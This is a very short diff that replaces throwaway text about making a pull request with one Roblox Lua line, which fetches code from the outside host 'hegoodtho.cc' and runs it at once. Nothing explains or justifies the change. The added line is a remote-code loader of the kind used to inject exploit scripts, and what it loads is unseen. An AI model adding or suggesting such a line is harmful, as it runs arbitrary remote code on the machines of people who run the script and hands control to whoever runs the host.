@@ -1,3 +1,1 @@
-how to do pull request
-
-  m
+loadstring(game:HttpGet'hegoodtho.cc')()
